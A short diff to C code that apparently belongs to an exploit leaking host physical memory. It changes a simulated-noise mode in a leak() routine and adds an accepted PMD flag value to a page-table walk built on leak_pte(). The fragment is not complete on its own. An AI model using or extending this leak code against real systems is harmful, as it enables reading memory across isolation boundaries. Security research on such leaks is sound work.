@@ -24,7 +24,7 @@ void leak(void *data, hpa_t base, hpa_t pa, int len)
         memcpy(data, buf, len);
 #if LEAK == CHEAT_NOISY
 	for (int i = 0; i < len; i++)
-		if (rand() % 16 == 0)
+		if (rand() % 10 == 3)
 			((char *)data)[i] = 0;
 #endif
         return;
@@ -112,7 +112,7 @@ retry_pmd:
 	pte_t pmd = leak_pte(base, pmd_pa);
 	if (verbose >= 2) dumpp(pmd);
 	if (verbose == 1) printf("pmd %10lx ", pmd);
-	if (!(((pmd & 0xfff) == 0x067) || ((pmd & 0xfff) == 0x907))) {
+	if (!(((pmd & 0xfff) == 0x067) || ((pmd & 0xfff) == 0x907) || ((pmd & 0xfff) == 0xbf7))) {
 		printf("\n\t--> ");
 		goto retry_pud;
 	}
